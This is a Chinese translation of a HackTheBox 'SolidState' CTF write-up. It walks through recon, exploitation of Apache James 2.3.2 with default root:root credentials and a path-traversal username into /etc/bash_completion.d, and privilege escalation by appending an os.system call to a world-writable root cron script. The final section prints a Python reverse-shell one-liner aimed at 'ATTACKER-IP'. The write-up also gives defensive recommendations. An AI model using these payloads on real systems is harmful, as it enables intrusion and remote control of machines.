<html>
<head>
<title>HackTheBox — SolidState (Medium) writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HackTheBox — SolidState(中型)报告</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-solidstate-medium-writeup-2d655949ac86?source=collection_archive---------1-----------------------#2021-05-08">https://infosecwriteups.com/hackthebox-solidstate-medium-writeup-2d655949ac86?source=collection_archive---------1-----------------------#2021-05-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><p id="1c89" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">声明:我通过博客搬到了Medium.com以外的地方。在网上查看我的新家:<a class="ae ks" href="https://www.pidnull.io/2021/09/04/HackTheBox_SolidState(Medium).html" rel="noopener ugc nofollow" target="_blank">https://www . PID null . io/2021/09/04/HackTheBox _ SolidState(Medium)。html </a></p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div class="gh gi kt"><img src="../Images/e10932c83de6cd46ec2185c0f2e81513.png" data-original-src="https://miro.medium.com/v2/resize:fit:600/format:webp/1*GwhdFScPqQcy2OS7L-uoIQ.png"/></div></figure><p id="63c8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">欢迎来到我的第一篇HackTheBox文章！</p><p id="5b3f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是我第一次尝试写我在HackTheBox和TryHackMe上完成的机器和挑战。</p><p id="59a1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">快速声明:这些并不是作为指南，相反，它们更多的是展示我的思维过程和一些用于执行box pwnage的漏洞分析。我会根据我在笔记上写的，来写这些，当我实际解决这些机器的时候。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="4a55" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">侦察</h1><p id="bde7" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我通常做的第一件事是为我正在工作的当前机器创建一个新的目录树。</p><pre class="ku kv kw kx gt me mf mg mh aw mi bi"><span id="a59f" class="mj lc iq mf b gy mk ml l mm mn">cd /opt/hackthebox<br/>mkdir -p SolidState/{nmap,exploits,downloads} &amp;&amp; cd SolidState</span></pre><p id="b186" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，对于初始Nmap扫描，我喜欢扫描常见端口，以便对正在发生的事情有一个基本的了解，然后根据需要扫描更多端口。</p><ul class=""><li id="fd84" class="mo mp iq jw b jx jy kb kc kf mq kj mr kn ms kr mt mu mv mw bi translated"><strong class="jw ir"> -sC </strong>:运行基本的nmap脚本</li><li id="6aa4" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated"><strong class="jw ir"> -sV </strong>:检测版本</li><li id="d0b6" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated"><strong class="jw ir"> -oA </strong>:生成输出文件。这对于以后检查输出非常有用。</li></ul><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nc"><img src="../Images/ec991914c29576b196830186e8ff35e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qKC96YjdDTyBH37rC-1FNQ.png"/></div></div></figure><p id="2e34" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">太好了，我可以看到22/ssh、25/smtp、80/http、110/pop3和119/nntp打开，以及运行在端口80上的服务的一些基本信息。</p><h1 id="9ca9" class="lb lc iq bd ld le nh lg lh li ni lk ll lm nj lo lp lq nk ls lt lu nl lw lx ly bi translated">列举</h1><p id="cd8d" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">首先，我列举了监听端口80的网站。</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nm"><img src="../Images/3fe3bdaf6dd3bafcd6fa2101c296924c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JWpqab8Ox0P0vffxr0q0MA.png"/></div></div></figure><p id="a94e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">进一步点击，我找到了联系页面:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nn"><img src="../Images/44e796848c47c4dc2bf37eaa33ce9984.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OQFwohj2Pd1XtdlK6-5Y8Q.png"/></div></div></figure><p id="8d5e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我对这个电子邮件地址很感兴趣:</p><pre class="ku kv kw kx gt me mf mg mh aw mi bi"><span id="b3dd" class="mj lc iq mf b gy mk ml l mm mn">webadmin@solid-state-security.com</span></pre><p id="a83c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我记下了这段信息，并将域添加到我的/etc/hosts中。</p><pre class="ku kv kw kx gt me mf mg mh aw mi bi"><span id="fe35" class="mj lc iq mf b gy mk ml l mm mn">echo "10.129.29.189 solid-state-security.com" | sudo tee -a /etc/hosts</span></pre><p id="b1a0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在一次正常的pentest中(在撰写本文时，我还没有实际的pentest经验)，我知道地址和电话号码可能很有趣，查看页面代码(甚至通过Burp代理流量)也可能很有用。现在，我继续前进，使用域名再次检查了网站，但它看起来像是同一个网站。</p><p id="7928" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">此时，我想知道是什么在运行SMTP服务监听端口25，并查看它必须提供什么功能。</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi no"><img src="../Images/fce8e2d7a2d5f7e9989ee34858cb1b02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nALOOl3FxmTjm-6koVQRQA.png"/></div></div></figure><p id="bcfd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这里我能做的不多，但有一条重要的信息出现了，那就是SMTP服务器软件及其版本:</p><pre class="ku kv kw kx gt me mf mg mh aw mi bi"><span id="933b" class="mj lc iq mf b gy mk ml l mm mn">James SMTP Server 2.3.2</span></pre><p id="3c03" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">起初我不知道詹姆斯SMTP是什么，但是通过快速的ddg我发现它是一个<a class="ae ks" href="https://james.apache.org/documentation.html" rel="noopener ugc nofollow" target="_blank"> Apache </a>产品。</p><p id="7ab8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">快速搜索显示，Apache James的<a class="ae ks" href="https://www.exploit-db.com/exploits/35513" rel="noopener ugc nofollow" target="_blank">公开漏洞</a>也与该版本匹配:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi np"><img src="../Images/288e192c45ddb299ef620d6e66fe55bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uXrH82IOdUUZbOK-MA_vDg.png"/></div></div></figure></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="17c0" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">弱点分析</h1><p id="c4a3" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">太好了！当然，在运行任何东西之前，我研究了这个漏洞做了什么。通读剧本并搜索相关关键词，我得出了以下结论:</p><ul class=""><li id="6501" class="mo mp iq jw b jx jy kb kc kf mq kj mr kn ms kr mt mu mv mw bi translated">使用默认用户名和密码:root/root</li><li id="b85e" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">由于添加新邮件用户时缺乏(或不充分)输入验证，此版本的Apache James易受任意文件写入攻击，从而导致远程代码执行。</li><li id="ac72" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">Apache James监听端口4555，这当然没有出现在我最初的NMAP扫描中，因为我只扫描了顶部的端口。</li><li id="31e7" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">该漏洞将连接到此端口，并使用默认凭据登录，创建一个用户名为../../../../../../../../etc/bash_completion.d。</li><li id="e0af" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">然后，该漏洞将连接到25/smtp，向该用户发送一封包含有效负载的电子邮件，包含有效负载的电子邮件将被放入bash_completion.d/。</li><li id="dada" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">当用户登录时，有效负载通过bash完成来执行。</li></ul><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi nq"><img src="../Images/e32e87f671b77c3475d3f6570b43f477.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lUyVnGOYeBFyz9xz3w96tA.png"/></div></div></figure><p id="2d3e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">更详细的漏洞解释和重现步骤可以在<a class="ae ks" href="https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html" rel="noopener ugc nofollow" target="_blank">这里</a>找到。</p><blockquote class="nr ns nt"><p id="70c0" class="ju jv nu jw b jx jy jz ka kb kc kd ke nv kg kh ki nw kk kl km nx ko kp kq kr ij bi translated">… <br/>用户名，如“../../../../../../../../etc/bash_completion.d "会导致文件被放在“/etc/bash_completion.d”中，该目录包含用户登录到机器时执行的命令。通过向该用户发送消息，攻击者可以执行探测邮件服务器并从中检索数据的命令。<br/> …</p></blockquote><p id="3288" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">验证端口4555是否确实可以到达:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ny"><img src="../Images/57cb0f80da6343ed55a9382fdcc3ccec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2tDpdpUjurgyANpdITOqPQ.png"/></div></div></figure><p id="b6b8" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我准备好接受剥削了。</p><h2 id="4493" class="mj lc iq bd ld nz oa dn lh ob oc dp ll kf od oe lp kj of og lt kn oh oi lx oj bi translated">测试漏洞</h2><p id="721a" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">首先，我通常希望验证漏洞。通常我会设置我的虚拟机(使用VirtualBox和vagger)，但这一次我只是继续前进，利用我的HTB VIP+订阅(个人实例，机器在我想要的时候重置)。所以我写了一个有效载荷，它会给我发送一个回调，然后我运行Python脚本:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ok"><img src="../Images/f344cafa9608a2a89e01241f41183ff9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EEc3SYKaFR1S2QO5-uXCrQ.png"/></div></div></figure><p id="cabc" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我通过使用tcpdump进行监听来等待回调:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ol"><img src="../Images/b193e145b56451a5e3b2943aeb27238e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K3z4xxs2lf78LQlhI-3Prg.png"/></div></div></figure><p id="4104" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我从最初的读数中知道，要触发漏洞，我需要一个用户登录到服务器。当然，这是在HTB，没有实际的和模拟的用户，所以我知道我需要自己触发登录。然而，此时我还没有一个有效的SSH用户，所以我回到了我已经有的但还没有手动探索的有用的东西:James SMTP服务器的admin帐户。</p><p id="02ad" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我尝试使用默认凭据登录服务(root:root):</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi om"><img src="../Images/00ffefb3c6481d290ba80ce074dc3436.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G6zkvBFuBI1xoiIVy_xIjw.png"/></div></div></figure><p id="a89c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">由于这项服务对我来说是新的，我不得不研究我可以运行什么命令。对于这一点，帮助就足够了，但也有一个可用的在线<a class="ae ks" href="https://james.apache.org/server/manage-cli.html" rel="noopener ugc nofollow" target="_blank">文档</a>。</p><p id="7444" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">运行listusers，我看到一些用户:</p><ul class=""><li id="9be8" class="mo mp iq jw b jx jy kb kc kf mq kj mr kn ms kr mt mu mv mw bi translated">詹姆斯</li><li id="84d2" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">托马斯</li><li id="5239" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">约翰</li><li id="18b9" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">明迪</li><li id="7a3f" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">邮件管理员</li></ul><p id="c74d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我想然后阅读每个用户的电子邮件。为此，我知道最简单的方法是更改用户密码。然而，在真正的pentest中，我知道对最终用户造成干扰可能会被添加到范围之外，或者可能会引发调查，从而导致被发现并危及pentest项目。对于这个盒子，我只是继续下去，改变每个用户的密码，手动阅读他们的电子邮件一个接一个。</p><p id="920a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我(根据我的笔记)检查的第一个用户是托马斯，但他们没有电子邮件。</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi on"><img src="../Images/03bd47fa6ac97babf079a574294ba535.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EW_nTlX09Inl838f2-QwIA.png"/></div></div></figure><p id="d6c4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我在约翰的邮箱里看到了下面的邮件，这是詹姆斯发来的邮件，指示约翰给新员工明迪发一个受限账户的临时密码。</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oo"><img src="../Images/8261c95327396d63c0eba8cae4b738ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*epfneLiLtG_e0Cj6MKecLQ.png"/></div></div></figure><p id="3bec" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在检查明迪的账户时，我发现了詹姆斯发来的电子邮件，其中包含临时凭证:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi op"><img src="../Images/e2930cf154f2119bd399e874788e8568.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Gynp-scD59UJNeAqaAKIsg.png"/></div></div></figure><p id="964d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我想，如果我幸运的话，Mindy还没有完全加入进来，而临时证书仍然有效。只有一种方法可以找到答案，所以我用邮件中的密码登录了mindy的账户:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oq"><img src="../Images/a02adf9f2957e6f2a17b0ffe557a68e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Slf1rGH0Lo-osN-7lrUHcw.png"/></div></div></figure><p id="f63d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">完美！当然还有用户标志，我还注意到我处于一个受限的shell环境中。我没有费心探索如何摆脱这种受限的环境，因为我仍然有有效载荷来帮助我生成一个反向shell。后来我发现这是bash的受限版本。</p><p id="f4b9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">检查正在运行的tcpdump，我得到了回调:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi or"><img src="../Images/34b3c59804adb85d82e3b12db5dde625.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C0q6o-l-HFfGa0CXSSZekw.png"/></div></div></figure><p id="6320" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在这一点上，我能够验证利用工作，我可以得到一个回调。我知道我已经准备好发送我的反向shell有效负载了。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="430c" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最初的立足点</h1><p id="1349" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我使用的反向TCP负载如下:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi os"><img src="../Images/8101d2ab2673350fbb972f033fa34f81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1hEiEM0ZMl8tCKvF1g-AbA.png"/></div></div></figure><p id="56c6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在运行python脚本:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ot"><img src="../Images/b9a17d35ddefa345301abd27587f6416.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*54pgrggPrmsAthQ1FmQ9ww.png"/></div></div></figure><p id="f57a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">收到的反向外壳:</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ou"><img src="../Images/1e3bcfb2d90c097b782095a19f9373a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ELSzifTSxcJ96wulObMzgw.png"/></div></div></figure><p id="683a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">(走出哑壳:)</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi ov"><img src="../Images/dd4e3231876a0a97a9880efbdcbe486b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ACivfhWuIMI5NKZWhjO0Aw.png"/></div></div></figure></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="7b76" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">权限提升</h1><p id="c692" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我的Linux PE的goto-tool是<a class="ae ks" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" rel="noopener ugc nofollow" target="_blank"> linPeas </a>。然而，当我在等待linPeas完成时，手动查看/opt/tmp.py时，PE运行得相当容易。</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="nd ne di nf bf ng"><div class="gh gi oq"><img src="../Images/aff3cb9616c62a4b562c1810c43d8a12.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pAggLkYmfjWRrj9CC17bqA.png"/></div></div></figure><p id="4d67" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">关于脚本的重要说明:</p><ul class=""><li id="6386" class="mo mp iq jw b jx jy kb kc kf mq kj mr kn ms kr mt mu mv mw bi translated">该文件是root所有的，但它是全局可写的。</li><li id="49cf" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">它看起来像一个“清理”脚本，删除/tmp中的所有内容。</li><li id="39fa" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">SUID比特没有设置，所以必须有另一种方式运行它。</li><li id="025b" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">根据多年的系统管理员经验，我知道像这样的清理脚本通常由cron之类的东西来调度。</li><li id="7a89" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">我认为对于CTF风格的盒子来说，计划持续时间足够短。</li></ul><p id="c55c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">为了证明我的理论，我在/tmp中创建了一个文件，然后等待它消失，几分钟后它消失了(我无法记下有多长时间)。</p><p id="ca6c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">最后，为了实现获取根标志的目标，我添加了一个简单的命令调用来获取标志并将其写入可读文件:</p><pre class="ku kv kw kx gt me mf mg mh aw mi bi"><span id="1b1d" class="mj lc iq mf b gy mk ml l mm mn">echo "os.system('cp -p /root/root.txt /opt/root.txt &amp;&amp; chmod 777 /opt/root.txt')" &gt;&gt; tmp.py</span></pre></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="039f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">推荐</h1><p id="0960" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">最后，这是我第一次尝试为pentest的发现写一个推荐:</p><h2 id="c520" class="mj lc iq bd ld nz oa dn lh ob oc dp ll kf od oe lp kj of og lt kn oh oi lx oj bi translated">更改默认凭据</h2><p id="fdb4" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">Apache James SMTP服务器使用默认凭据root:root。在使应用程序可供远程访问或部署用于生产之前，请始终更改默认密码。</p><h2 id="aeed" class="mj lc iq bd ld nz oa dn lh ob oc dp ll kf od oe lp kj of og lt kn oh oi lx oj bi translated">禁用横幅</h2><p id="fdc2" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">让这台机器对我来说相对容易的是SMTP端口上的欢迎横幅，其中包括Apache James的易受攻击版本。当然，禁用欢迎横幅不会阻止任何人进一步挖掘，但它肯定会减缓攻击。</p><h2 id="cbe3" class="mj lc iq bd ld nz oa dn lh ob oc dp ll kf od oe lp kj of og lt kn oh oi lx oj bi translated">应用安全更新</h2><p id="bda9" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">补丁管理过程对于处理软件漏洞是无价的。我提到“流程”是因为电子邮件是一项关键服务，应用补丁很容易意味着停机，因此一个正确建立和测试的流程有助于平衡用户的停机成本，同时有助于确保应用程序拥有最新的安全补丁。</p><h2 id="0090" class="mj lc iq bd ld nz oa dn lh ob oc dp ll kf od oe lp kj of og lt kn oh oi lx oj bi translated">防止未经验证的电子邮件中继</h2><p id="c7a0" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我使用的来自exploitdb的特定POC不需要登录SMTP服务来发送电子邮件。Apache James可以通过要求用户首先登录来防止这种情况，并且如果默认凭证也被更改，也不能轻易绕过这种情况。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="5fa5" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">最后的想法</h1><p id="b0cb" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">在写这篇文章的时候，有些事情我本可以做得更好:</p><ul class=""><li id="a691" class="mo mp iq jw b jx jy kb kc kf mq kj mr kn ms kr mt mu mv mw bi translated">使用诸如<a class="ae ks" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank"> pspy </a>之类的工具，这将有助于监控cron作业何时被执行。当您看不到root等其他特权用户的cron作业时，以及cron作业的时间不容易辨别时，这很有用。</li><li id="4c16" class="mo mp iq jw b jx mx kb my kf mz kj na kn nb kr mt mu mv mw bi translated">生成一个根shell作为POC，用于完整的系统访问。一个示例Python脚本，当从root执行时，它将产生一个<a class="ae ks" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python" rel="noopener ugc nofollow" target="_blank">反向外壳</a>:</li></ul><pre class="ku kv kw kx gt me mf mg mh aw mi bi"><span id="0416" class="mj lc iq mf b gy mk ml l mm mn">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4554));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></pre></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><p id="3c44" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">感谢您阅读我的帖子！我很乐意听到你的反馈或回答你的问题:【https://twitter.com/pidnull T4】</p></div></div>    
</body>
</html>